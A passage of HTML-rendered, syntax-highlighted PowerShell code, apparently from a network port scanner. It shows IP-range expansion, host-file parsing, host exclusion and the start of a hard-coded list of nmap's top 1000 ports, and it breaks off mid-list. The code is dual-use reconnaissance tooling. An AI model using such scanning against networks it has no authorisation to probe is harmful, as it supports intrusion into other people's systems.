= (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">0</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">1</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">2</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">3</span>].ToString())<br>                                    <span class="hljs-variable">$null</span> = <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$CurrentIPString</span>)<br>                                &#125;<br><br>                                <span class="hljs-keyword">if</span>((<span class="hljs-variable">$i</span> <span class="hljs-operator">-eq</span> <span class="hljs-number">3</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>] <span class="hljs-operator">-lt</span> <span class="hljs-variable">$Max</span>))<br>                                &#123;<br>                                    <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>]++<br><br>                                    <span class="hljs-variable">$CurrentIPString</span> = (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">0</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">1</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">2</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">3</span>].ToString())<br>                                    <span class="hljs-variable">$null</span> = <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$CurrentIPString</span>)<br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br><br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$iHost</span>)<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-ILHosts</span></span><br>        &#123;<br>           <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$HostFile</span><br>            )<br><br>            <span class="hljs-built_in">Get-Content</span> <span class="hljs-variable">$HostFile</span> | <span class="hljs-built_in">ForEach-Object</span> &#123;<br>                Parse<span class="hljs-literal">-Hosts</span> <span class="hljs-variable">$_</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Exclude-Hosts</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$excludeHosts</span><br>            )<br><br>            [<span class="hljs-built_in">String</span>[]] <span class="hljs-variable">$iHosts</span> = <span class="hljs-variable">$excludeHosts</span>.Split(<span class="hljs-string">&quot;,&quot;</span>)<br><br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$iHost</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$iHosts</span>)<br>            &#123;<br>                <span class="hljs-variable">$iHost</span> = <span class="hljs-variable">$iHost</span>.Replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-variable">$hostList</span>.Remove(<span class="hljs-variable">$iHost</span>)<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-TopPort</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)]<br>                [<span class="hljs-type">ValidateRange</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>)]<br>                [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$numPorts</span><br>            )<br><br>            <span class="hljs-comment">#list of top 1000 ports from nmap from Jun 2013</span><br>            [<span class="hljs-built_in">int</span>[]] <span class="hljs-variable">$topPortList</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">80</span>,<span class="hljs-number">23</span>,<span class="hljs-number">443</span>,<span class="hljs-number">21</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">110</span>,<span class="hljs-number">445</span>,<span class="hljs-number">139</span>,<span class="hljs-number">143</span>,<span class="hljs-number">53</span>,<span class="hljs-number">135</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">22</span><br>                        <span class="hljs-number">1723</span>,<span class="hljs-number">111</span>,<span class="hljs-number">995</span>,<span class="hljs-number">993</span>,<span class="hljs-number">5900</span>,<span class="hljs-number">1025</span>,<span class="hljs-number">1720</span>,<span class="hljs-number">548</span>,<span class="hljs-number">113</span>,<span class="hljs-number">81</span>,<span class="hljs-number">6001</span>,<span class="hljs-number">179</span>,<span class="hljs-number">1026</span>,<span class="hljs-number">2000</span>,<span class="hljs-number">8443</span>,<br>                        <span class="hljs-number">8000</span>,<span class="hljs-number">32768</span>,<span class="hljs-number">554</span>,<span class="hljs-number">26</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">49152</span>,<span class="hljs-number">2001</span>,<span class="hljs-number">515</span>,<span class="hljs-number">8008</span>,<span class="hljs-number">49154</span>,<span class="hljs-number">1027</span>,<span class="hljs-number">5666</span>,<span class="hljs-number">646</span>,<span class="hljs-number">5000</span>,<br>                        <span class="hljs-number">5631</span>,<span class="hljs-number">631</span>,<span class="hljs-number">49153</span>,<span class="hljs-number">8081</span>,<span class="hljs-number">2049</span>,<span class="hljs-number">88</span>,<span class="hljs-number">79</span>,<span class="hljs-number">5800</span>,<span class="hljs-number">106</span>,<span class="hljs-number">2121</span>,<span class="hljs-number">1110</span>,<span class="hljs-number">49155</span>,<span class="hljs-number">6000</span>,<span class="hljs-number">513</span>,<br>                        <span class="hljs-number">990</span>,<span class="hljs-number">5357</span>,<span class="hljs-number">49156</span>,<span class="hljs-number">543</span>,<span class="hljs-number">544</span>,<span class="hljs-number">5101</span>,<span class="hljs-number">144</span>,<span class="hljs-number">7</span>,<span class="hljs-number">389</span>,<span class="hljs-number">8009</span>,<span class="hljs-number">9999</span>,<span class="hljs-number">5009</span>,<span class="hljs-number">7070</span>,<span class="hljs-number">5190</span>,<span class="hljs-number">3000</span>,<br>                        <span class="hljs-number">5432</span>,<span class="hljs-number">1900</span>,<span class="hljs-number">3986</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1029</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5051</span>,<span class="hljs-number">6646</span>,<span class="hljs-number">49157</span>,<span class="hljs-number">1028</span>,<span class="hljs-number">873</span>,<span class="hljs-number">1755</span>,<span class="hljs-number">2717</span>,<span class="hljs-number">4899</span>,<span class="hljs-number">9100</span>,<br>                        <span class="hljs-number">119</span>,<span class="hljs-number">37</span>,<span class="hljs-number">1000</span>,<span class="hljs-number">3001</span>,<span class="hljs-number">5001</span>,<span class="hljs-number">82</span>,<span class="hljs-number">10010</span>,<span class="hljs-number">1030</span>,<span class="hljs-number">9090</span>,<span class="hljs-number">2107</span>,<span class="hljs-number">1024</span>,<span class="hljs-number">2103</span>,<span class="hljs-number">6004</span>,<span class="hljs-number">1801</span>,<br>                        <span class="hljs-number">5050</span>,<span class="hljs-number">19</span>,<span class="hljs-number">8031</span>,<span class="hljs-number">1041</span>,<span class="hljs-number">255</span>,<span class="hljs-number">1048</span>,<span class="hljs-number">1049</span>,<span class="hljs-number">1053</span>,<span class="hljs-number">1054</span>,<span class="hljs-number">1056</span>,<span class="hljs-number">1064</span>,<span class="hljs-number">3703</span>,<span class="hljs-number">17</span>,<span class="hljs-number">808</span>,<span class="hljs-number">3689</span>,<br>                        <span class="hljs-number">1031</span>,<span class="hljs-number">1044</span>,<span class="hljs-number">1071</span>,<span class="hljs-number">5901</span>,<span class="hljs-number">100</span>,<span class="hljs-number">9102</span>,<span class="hljs-number">2869</span>,<span class="hljs-number">4001</span>,<span class="hljs-number">5120</span>,<span class="hljs-number">8010</span>,<span class="hljs-number">9000</span>,<span class="hljs-number">2105</span>,<span class="hljs-number">636</span>,<span class="hljs-number">1038</span>,<br>                        <span class="hljs-number">2601</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7000</span>,<span class="hljs-number">1066</span>,<span class="hljs-number">1069</span>,<span class="hljs-number">625</span>,<span class="hljs-number">311</span>,<span class="hljs-number">280</span>,<span class="hljs-number">254</span>,<span class="hljs-number">4000</span>,<span class="hljs-number">1761</span>,<span class="hljs-number">5003</span>,<span class="hljs-number">2002</span>,<span class="hljs-number">1998</span>,<span class="hljs-number">2005</span>,<br>                        <span class="hljs-number">1032</span>,<span class="hljs-number">1050</span>,<span class="hljs-number">6112</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">2161</span>,<span class="hljs-number">6002</span>,<span class="hljs-number">2401</span>,<span class="hljs-number">902</span>,<span class="hljs-number">4045</span>,<span class="hljs-number">787</span>,<span class="hljs-number">7937</span>,<span class="hljs-number">1058</span>,<span class="hljs-number">2383</span>,<span class="hljs-number">1033</span>,<br>                        <span class="hljs-number">1040</span>,<span class="hljs-number">1059</span>,<span class="hljs-number">50000</span>,<span class="hljs-number">5555</span>,<span class="hljs-number">1494</span>,<span class="hljs-number">3</span>,<span class="hljs-number">593</span>,<span class="hljs-number">2301</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">7938</span>,<span class="hljs-number">1022</span>,<span class="hljs-number">1234</span>,<span class="hljs-number">1035</span>,<span class="hljs-number">1036</span>,<span class="hljs-number">1037</span>,<br>                        <span class="hljs-number">1074</span>,<span class="hljs-number">8002</span>,<span class="hljs-number">9001</span>,<span class="hljs-number">464</span>,<span class="hljs-number">497</span>,<span class="hljs-number">1935</span>,<span class="hljs-number">2003</span>,<span class="hljs-number">6666</span>,<span class="hljs-number">6543</span>,<span class="hljs-number">24</span>,<span class="hljs-number">1352</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">1111</span>,<span class="hljs-number">407</span>,<span class="hljs-number">500</span>,<br>                        <span class="hljs-number">20</span>,<span class="hljs-number">2006</span>,<span class="hljs-number">1034</span>,<span class="hljs-number">1218</span>,<span class="hljs-number">3260</span>,<span class="hljs-number">15000</span>,<span class="hljs-number">4444</span>,<span class="hljs-number">264</span>,<span class="hljs-number">33</span>,<span class="hljs-number">2004</span>,<span class="hljs-number">1042</span>,<span class="hljs-number">42510</span>,<span class="hljs-number">999</span>,<span class="hljs-number">3052</span>,<span class="hljs-number">1023</span>,<br>                        <span class="hljs-number">222</span>,<span class="hljs-number">1068</span>,<span class="hljs-number">888</span>,<span class="hljs-number">7100</span>,<span class="hljs-number">1717</span>,<span class="hljs-number">992</span>,<span class="hljs-number">2008</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">2007</span>,<span class="hljs-number">8082</span>,<span class="hljs-number">512</span>,<span class="hljs-number">1043</span>,<span class="hljs-number">2009</span>,<span class="hljs-number">5801</span>,<span class="hljs-number">1700</span>,<br>                        <span class="hljs-number">7019</span>,<span class="hljs-number">50001</span>,<span class="hljs-number">4662</span>,<span class="hljs-number">2065</span>,<span class="hljs-number">42</span>,<span class="hljs-number">2602</span>,<span class="hljs-number">3333</span>,<span class="hljs-number">9535</span>,<span class="hljs-number">5100</span>,<span class="hljs-number">2604</span>,<span class="hljs-number">4002</span>,<span class="hljs-number">5002</span>,<span class="hljs-number">1047</span>,<span class="hljs-number">1051</span>,<span class="hljs-number">1052</span>,<br>                        <span class="hljs-number">1055</span>,<span class="hljs-number">1060</span>,<span class="hljs-number">1062</span>,<span class="hljs-number">1311</span>,<span class="hljs-number">3283</span>,<span class="hljs-number">4443</span>,<span class="hljs-number">5225</span>,<span class="hljs-number">5226</span>,<span class="hljs-number">6059</span>,<span class="hljs-number">6789</span>,<span class="hljs-number">8089</span>,<span class="hljs-number">8651</span>,<span class="hljs-number">8652</span>,<span class="hljs-number">8701</span>,<span class="hljs-number">9415</span>,<br>                        <span class="hljs-number">9593</span>,<span class="hljs-number">9594</span>,<span class="hljs-number">9595</span>,<span class="hljs-number">16992</span>,<span class="hljs-number">16993</span>,<span class="hljs-number">20828</span>,<span class="hljs-number">23502</span>,<span class="hljs-number">32769</span>,<span class="hljs-number">33354</span>,<span class="hljs-number">35500</span>,<span class="hljs-number">52869</span>,<span class="hljs-number">55555</span>,<span class="hljs-number">55600</span>,<br>                        <span class="hljs-number">64623</span>,<span class="hljs-number">64680</span>,<span class="hljs-number">65000</span>,<span class="hljs-number">65389</span>,<span class="hljs-number">1067</span>,<span class="hljs-number">13782</span>,<span class="hljs-number">366</span>,<span class="hljs-number">5902</span>,<span class="hljs-number">9050</span>,<span class="hljs-number">85</span>,<span class="hljs-number">1002</span>,<span class="hljs-number">5500</span>,<span class="hljs-number">1863</span>,<span class="hljs-number">1864</span>,<br>                        <span class="hljs-number">5431</span>,<span class="hljs-number">8085</span>,<span class="hljs-number">10243</span>,<span class="hljs-number">45100</span>,<span class="hljs-number">49999</span>,<span class="hljs-number">51103</span>,<span class="hljs-number">49</span>,<span class="hljs-number">90</span>,<span class="hljs-number">6667</span>,<span class="hljs-number">1503</span>,<span class="hljs-number">6881</span>,<span class="hljs-number">27000</span>,<span class="hljs-number">340</span>,<span class="hljs-number">1500</span>,<span class="hljs-number">8021</span>,<br>                        <span class="hljs-number">2222</span>,<span class="hljs-number">5566</span>,<span class="hljs-number">8088</span>,<span class="hljs-number">8899</span>,<span class="hljs-number">9071</span>,<span class="hljs-number">5102</span>,<span class="hljs-number">6005</span>,<span class="hljs-number">9101</span>,<span class="hljs-number">163</span>,<span class="hljs-number">5679</span>,<span class="hljs-number">146</span>,<span class="hljs-number">648</span>,<span class="hljs-number">1666</span>,<span class="hljs-number">83</span>,<span class="hljs-number">3476</span>,<span class="hljs-number">5004</span>,<br>                        <span class="hljs-number">5214</span>,<span class="hljs-number">8001</span>,<span class="hljs-number">8083</span>,<span class="hljs-number">8084</span>,<span class="hljs-number">9207</span>,<span class="hljs-number">14238</span>,<span class="hljs-number">30</span>,<span class="hljs-number">912</span>,<span class="hljs-number">12345</span>,<span class="hljs-number">2030</span>,<span class="hljs-number">2605</span>,<span class="hljs-number">6</span>,<span class="hljs-number">541</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1248</span>,<span class="hljs-number">3005</span>,<span class="hljs-number">8007</span>,<br>                        <span class="hljs-number">306</span>,<span class="hljs-number">880</span>,<span class="hljs-number">2500</span>,<span class="hljs-number">1086</span>,<span class="hljs-number">1088</span>,<span class="hljs-number">2525</span>,<span class="hljs-number">4242</span>,<span class="hljs-number">8291</span>,<span class="hljs-number">9009</span>,<span class="hljs-number">52822</span>,<span class="hljs-number">900</span>,<span class="hljs-number">6101</span>,<span class="hljs-number">2809</span>,<span class="hljs-number">7200</span>,<span class="hljs-number">211</span>,<span class="hljs-number">800</span>,<br>                        <span class="hljs-number">987</span>,<span class="hljs-number">1083</span>,<span class="hljs-number">12000</span>,<span class="hljs-number">705</span>,<span class="hljs-number">711</span>,<span class="hljs-number">20005</span>,<span class="hljs-number">6969</span>,<span class="hljs-number">13783</span>,<span class="hljs-number">1045</span>,<span class="hljs-number">1046</span>,<span class="hljs-number">1061</span>,<span class="hljs-number">1063</span>,<span class="hljs-number">1070</span>,<span class="hljs-number">1072</span>,<span class="hljs-number">1073</span>,<br>                        <span class="hljs-number">1075</span>,<span class="hljs-number">1077</span>,<span class="hljs-number">1078</span>,<span class="hljs-number">1079</span>,<span class="hljs-number">1081</span>,<span class="hljs-number">1082</span>,<span class="hljs-number">1085</span>,<span class="hljs-number">1093</span>,<span class="hljs-number">1094</span>,<span class="hljs-number">1096</span>,<span class="hljs-number">1098</span>,<span class="hljs-number">1099</span>,<span class="hljs-number">1100</span>,<span class="hljs-number">1104</span>,<span class="hljs-number">1106</span>,<br>                        <span class="hljs-number">1107</span>,<span class="hljs-number">1108</span>,<span class="hljs-number">1148</span>,<span class="hljs-number">1169</span>,<span class="hljs-number">1272</span>,<span class="hljs-number">1310</span>,<span class="hljs-number">1687</span>,<span class="hljs-number">1718</span>,<span class="hljs-number">1783</span>,<span class="hljs-number">1840</span>,<span class="hljs-number">2100</span>,<span class="hljs-number">2119</span>,<span class="hljs-number">2135</span>,<span class="hljs-number">2144</span>,<span class="hljs-number">2160</span>,<br>                        <span class="hljs-number">2190</span>,<span class="hljs-number">2260</span>,<span class="hljs-number">2381</span>,<span class="hljs-number">2399</span>,<span class="hljs-number">2492</span>,<span class="hljs-number">2607</span>,<span class="hljs-number">2718</span>,<span class="hljs-number">2811</span>,<span class="hljs-number">2875</span>,<span class="hljs-number">3017</span>,<span class="hljs-number">3031</span>,<span class="hljs-number">3071</span>,<span class="hljs-number">3211</span>,<span class="hljs-number">3300</span>,<span class="hljs-number">3301</span>,<br>                        <span class="hljs-number">3323</span>,<span class="hljs-number">3325</span>,<span class="hljs-number">3351</span>,<span class="hljs-number">3404</span>,<span class="hljs-number">3551</span>,<span class="hljs-number">3580</span>,<span class="hljs-number">3659</span>,<span class="hljs-number">3766</span>,<span class="hljs-number">3784</span>,<span class="hljs-number">3801</span>,<span class="hljs-number">3827</span>,<span class="hljs-number">3998</span>,<span class="hljs-number">4003</span>,<span class="hljs-number">4126</span>,<span class="hljs-number">4129</span>,<br>                        <span class="hljs-number">4449</span>,<span class="hljs-number">5222</span>,<span class="hljs-number">5269</span>,<span class="hljs-number">5633</span>,<span class="hljs-number">5718</span>,<span class="hljs-number">5810</span>,<span class="hljs-number">5825</span>,<span class="hljs-number">5877</span>,<span class="hljs-number">5910</span>,<span class="hljs-number">5911</span>,<span class="hljs-number">5925</span>,<span class="hljs-number">5959</span>,<span class="hljs-number">5960</span>,<span class="hljs-number">5961</span>,<span class="hljs-number">5962</span>,<br>                        <span class="hljs-number">5987</span>,<span class="hljs-number">5988</span>,<span class="hljs-number">5989</span>,<span class="hljs-number">6123</span>,<span class="hljs-number">6129</span>,<span class="hljs-number">6156</span>,<span class="hljs-number">6389</span>,<span class="hljs-number">6580</span>,<span class="hljs-number">6901</span>,<span class="hljs-number">7106</span>,<span class="hljs-number">7625</span>,<span class="hljs-number">7777</span>,<span class="hljs-number">7778</span>,<span class="hljs-number">7911</span>,<span class="hljs-number">8086</span>,<br>                        <span class="hljs-number">8181</span>,<span class="hljs-number">8222</span>,<span class="hljs-number">8333</span>,<span class="hljs-number">8400</span>,<span class="hljs-number">8402</span>,<span class="hljs-number">8600</span>,<span class="hljs-number">8649</span>,<span class="hljs-number">8873</span>,<span class="hljs-number">8994</span>,<span class="hljs-number">9002</span>,<span class="hljs-number">9011</span>,<span class="hljs-number">9080</span>,<span class="hljs-number">9220</span>,<span class="hljs-number">9290</span>,<span class="hljs-number">9485</span>,<br>                        <span class="hljs-number">9500</span>,<span class="hljs-number">9502</span>,<span class="hljs-number">9503</span>,<span class="hljs-number">9618</span>,<span class="hljs-number">9900</span>,<span class="hljs-number">9968</span>,<span class="hljs-number">10002</span>,<span class="hljs-number">10012</span>,<span class="hljs-number">10024</span>,<span class="hljs-number">10025</span>,<span class="hljs-number">10566</span>,<span class="hljs-number">10616</span>,<span class="hljs-number">10617</span>,<span class="hljs-number">10621</span>,<br>                        <span class="hljs-number">10626</span>,<span class="hljs-number">10628</span>,<span class="hljs-number">10629</span>,<span class="hljs-number">11110</span>,<span class="hljs-number">13456</span>,<span class="hljs-number">14442</span>,<span class="hljs-number">15002</span>,<span class="hljs-number">15003</span>,<span class="hljs-number">15660</span>,<span class="hljs-number">16001</span>,<span class="hljs-number">16016</span>,<span class="hljs-number">16018</span>,<span class="hljs-number">17988</span>,<br>                        <span class="hljs-number">19101</span>,<span class="hljs-number">19801</span>,<span class="hljs-number">19842</span>,<span class="hljs-number">20000</span>,<span class="hljs-number">20031</span>,<span class="hljs-number">20221</span>,<span class="hljs-number">20222</span>,<span class="hljs-number">21571</span>,<span class="hljs-number">22939</span>,<span class="hljs-number">24800</span>,<span class="hljs-number">25734</span>,<span class="hljs-number">27715</span>,<span class="hljs-number">28201</span>,<br>                        <span class="hljs-number">30000</span>,<span class="hljs-number">30718</span>,<span class="hljs-number">31038</span>,<span class="hljs-number">32781</span>,<span class="hljs-number">32782</span>,<span class="hljs-number">33899</span>,<span class="hljs-number">34571</span>,<span class="hljs-number">34572</span>,<span class="hljs-number">34573</span>,<span class="hljs-number">40193</span>,<span class="hljs-number">48080</span>,<span class="hljs-number">49158</span>,<span class="hljs-number">49159</span>,<br>                        <span class="hljs-number">49160</span>,<span class="hljs-number">50003</span>,<span class="hljs-number">50006</span>,<span class="hljs-number">50800</span>,<span class="hljs-number">57294</span>,<span class="hljs-number">58080</span>,<span class="hljs-number">60020</span>,<span class="hljs-number">63331</span>,<span class="hljs-number">65129</span>,<span class="hljs-number">691</span>,<span class="hljs-number">212</span>,<span class="hljs-number">1001</span>,<span class="hljs-number">1999</span>,<span class="hljs-number">2020</span>,<br>                        <span class="hljs-number">2998</span>,<span class="hljs-number">6003</span>,<span class="hljs-number">7002</span>,<span class="hljs-number">50002</span>,<span class="hljs-number">32</span>,<span class="hljs-number">2033</span>,<span class="hljs-number">3372</span>,<span class="hljs-number">99</span>,<span class="hljs-number">425</span>,<span class="hljs-number">749</span>,<span class="hljs-number">5903</span>,<span class="hljs-number">43</span>,<span class="hljs-number">458</span>,<span class="hljs-number">5405</span>,<span class="hljs-number">6106</span>,<span class="hljs-number">6502</span>,<span class="hljs-number">7007</span>,<br>                        <span class="hljs-number">13722</span>,<span class="hljs-number">1087</span>,<span class="hljs-number">1089</span>,<span class="hljs-number">1124</span>,<span class="hljs-number">1152</span>,<span class="hljs-number">1183</span>,<span class="hljs-number">1186</span>,<span class="hljs-number">1247</span>,<span class="hljs-number">1296</span>,<span class="hljs-number">1334</span>,<span class="hljs-number">1580</span>,<span class="hljs-number">1782</span>,<span class="hljs-number">2126</span>,<span class="hljs-number">2179</span>,<span class="hljs-number">2191</span>,<span class="hljs-number">2251</span>,<br>                        <span class="hljs-number">2522</span>,<span class="hljs-number">3011</span>,<span class="hljs-number">3030</span>,<span class="hljs-number">3077</span>,<span class="hljs-number">3261</span>,<span class="hljs-number">3493</span>,<span class="hljs-number">3546</span>,<span class="hljs-number">3737</span>,<span class="hljs-number">3828</span>,<span class="hljs-number">3871</span>,<span class="hljs-number">3880</span>,<span class="hljs-number">3918</span>,<span class="hljs-number">3995</span>,<span class="hljs-number">4006</span>,<span class="hljs-number">4111</span>,<span class="hljs-number">4446</span>,<br>                        <span class="hljs-number">5054</span>,<span class="hljs-number">5200</span>,<span class="hljs-number">5280</span>,<span class="hljs-number">5298</span>,<span class="hljs-number">5822</span>,<span class="hljs-number">5859</span>,<span class="hljs-number">5904</span>,<span class="hljs-number">5915</span>,<span class="hljs-number">5922</span>,<span class="hljs-number">5963</span>,<span class="hljs-number">7103</span>,<span class="hljs-number">7402</span>,<span class="hljs-number">7435</span>,<span class="hljs-number">7443</span>,<span class="hljs-number">7512</span>,<span class="hljs-number">8011</span>,<br>                        <span class="hljs-number">8090</span>,<span class="hljs-number">8100</span>,<span class="hljs-number">8180</span>,<span class="hljs-number">8254</span>,<span class="hljs-number">8500</span>,<span class="hljs-number">8654</span>,<span class="hljs-number">9091</span>,<span class="hljs-number">9110</span>,<span class="hljs-number">9666</span>,<span class="hljs-number">9877</span>,<span class="hljs-number">9943</span>,<span class="hljs-number">9944</span>,<span class="hljs-number">9998</span>,<span class="hljs-number">10004</span>,<span class="hljs-number">10778</span>,<span class="hljs-number">15742</span>,<br>                        <span class="hljs-number">16012</span>,<span class="hljs-number">18988</span>,<span class="hljs-number">19283</span>,<span class="hljs-number">19315</span>,<span class="hljs-number">19780</span>,<span class="hljs-number">24444</span>,<span class="hljs-number">27352</span>,<span class="hljs-number">27353</span>,<span class="hljs-number">27355</span>,<span class="hljs-number">32784</span>,<span class="hljs-number">49163</span>,<span class="hljs-number">49165</span>,<span class="hljs-number">49175</span>,<br>                        <span class="hljs-number">50389</span>,<span class="hljs-number">50636</span>,<span class="hljs-number">51493</span>,<span class="hljs-number">55055</span>,<span class="hljs-number">56738</span>,<span class="hljs-number">61532</span>,<span class="hljs-number">61900</span>,<span class="hljs-number">62078</span>,<span class="hljs-number">1021</span>,<span class="hljs-number">9040</span>,<span class="hljs-number">666</span>,<span class="hljs-number">700</span>,<span class="hljs-number">84</span>,<span class="hljs-number">545</span>,<span class="hljs-number">1112</span>,<br>                        <span class="hljs-number">1524</span>,<span class="hljs-number">2040</span>,<span class="hljs-number">4321</span>,<span class="hljs-number">5802</span>,<span class="hljs-number">38292</span>,<span class="hljs-number">49400</span>,<span class="hljs-number">1084</span>,<span class="hljs-number">1600</span>,<span class="hljs-number">2048</span>,<span class="hljs-number">2111</span>,<span class="hljs-number">3006</span>,<span class="hljs-number">6547</span>,<span class="hljs-number">6699</span>,<span class="hljs-number">9111</span>,<span class="hljs-number">16080</span>,<br>                        <span class="hljs-number">555</span>,<span class="hljs-number">667</span>,<span class="hljs-number">720</span>,<span class="hljs-number">801</span>,<span class="hljs-number">1443</span>,<span class="hljs-number">1533</span>,<span class="hljs-number">2106</span>,<span class="hljs-number">5560</span>,<span class="hljs-number">6007</span>,<span class="hljs-number">1090</span>,<span class="hljs-number">1091</span>,<span class="hljs-number">1114</span>,<span class="hljs-number">1117</span>,<span class="hljs-number">1119</span>,<span class="hljs-number">1122</span>,<span class="hljs-number">1131</span>,<span class="hljs-number">1138</span>,<br>                        <span class="hljs-number">1151</span>,<span class="hljs-number">1175</span>,<span class="hljs-number">1199</span>,<span class="hljs-number">1201</span>,<span class="hljs-number">1271</span>,<span class="hljs-number">1862</span>,<span class="hljs-number">2323</span>,<span class="hljs-number">2393</span>,<span class="hljs-number">2394</span>,<span class="hljs-number">2608</span>,<span class="hljs-number">2725</span>,<span class="hljs-number">2909</span>,<span class="hljs-number">3003</span>,<span class="hljs-number">3168</span>,<span class="hljs-number">3221</span>,<span class="hljs-number">3322</span>,<br>                        <span class="hljs-number">3324</span>,<span class="hljs-number">3390</span>,<span class="hljs-number">3517</span>,<span class="hljs-number">3527</span>,<span class="hljs-number">3800</span>,<span class="hljs-number">3809</span>,<span class="hljs-number">3814</span>,<span class="hljs-number">3826</span>,<span class="hljs-number">3869</span>,<span class="hljs-number">3878</span>,<span class="hljs-number">3889</span>,<span class="hljs-number">3905</span>,<span class="hljs-number">3914</span>,<span class="hljs-number">3920</span>,<span class="hljs-number">3945</span>,<span class="hljs-number">3971</span>,<br>                        <span class="hljs-number">4004</span>,<span class="hljs-number">4005</span>,<span class="hljs-number">4279</span>,<span class="hljs-number">4445</span>,<span class="hljs-number">4550</span>,<span class="hljs-number">4567</span>,<span class="hljs-number">4848</span>,<span class="hljs-number">4900</span>,<span class="hljs-number">5033</span>,<span class="hljs-number">5080</span>,<span class="hljs-number">5087</span>,<span class="hljs-number">5221</span>,<span class="hljs-number">5440</span>,<span class="hljs-number">5544</span>,<span class="hljs-number">5678</span>,<span class="hljs-number">5730</span>,<br>                        <span class="hljs-number">5811</span>,<span class="hljs-number">5815</span>,<span class="hljs-number">5850</span>,<span class="hljs-number">5862</span>,<span class="hljs-number">5906</span>,<span class="hljs-number">5907</span>,<span class="hljs-number">5950</span>,<span class="hljs-number">5952</span>,<span class="hljs-number">6025</span>,<span class="hljs-number">6510</span>,<span class="hljs-number">6565</span>,<span class="hljs-number">6567</span>,<span class="hljs-number">6689</span>,<span class="hljs-number">6692</span>,<span class="hljs-number">6779</span>,<span class="hljs-number">6792</span>,<br>                        <span class="hljs-number">6839</span>,<span class="hljs-number">7025</span>,<span class="hljs-number">7496</span>,<span class="hljs-number">7676</span>,<span class="hljs-number">7800</span>,<span class="hljs-number">7920</span>,<span class="hljs-number">7921</span>,<span class="hljs-number">7999</span>,<span class="hljs-number">8022</span>,<span class="hljs-number">8042</span>,<span class="hljs-number">8045</span>,<span class="hljs-number">8093</span>,<span class="hljs-number">8099</span>,<span class="hljs-number">8200</span>,<span class="hljs-number">8290</span>,<span class="hljs-number">8292</span>,<br>                        <span class="hljs-number">8300</span>,<span class="hljs-number">8383</span>,<span class="hljs-number">9003</span>,<span class="hljs-number">9081</span>,<span class="hljs-number">9099</span>,<span class="hljs-number">9200</span>,<span class="hljs-number">9418</span>,<span class="hljs-number">9575</span>,<span class="hljs-number">9878</span>,<span class="hljs-number">9898</span>,<span class="hljs-number">9917</span>,<span class="hljs-number">10003</span>,<span class="hljs-number">10180</span>,<span class="hljs-number">10215</span>,<span class="hljs-number">11111</span>,<br>                        <span class="hljs-number">12174</span>,<span class="hljs-number">12265</span>,<span class="hljs-number">14441</span>,<span class="hljs-number">15004</span>,<span class="hljs-number">16000</span>,<span class="hljs-number">16113</span>,<span class="hljs-number">17877</span>,<span class="hljs-number">18040</span>,<span class="hljs-number">18101</span>,<span class="hljs-number">19350</span>,<span class="hljs-number">25735</span>,<span class="hljs-number">26214</span>,<span class="hljs-number">27356</span>,<br>                        <span class="hljs-number">30951</span>,<span class="hljs-number">32783</span>,<span class="hljs-number">32785</span>,<span class="hljs-number">40911</span>,<span class="hljs-number">41511</span>,<span class="hljs-number">44176</span>,<span class="hljs-number">44501</span>,<span class="hljs-number">49161</span>,<span class="hljs-number">49167</span>,<span class="hljs-number">49176</span>,<span class="hljs-number">50300</span>,<span class="hljs-number">50500</span>,<span class="hljs-number">52673</span>,<br>                        <span class="hljs-number">52848</span>,<span 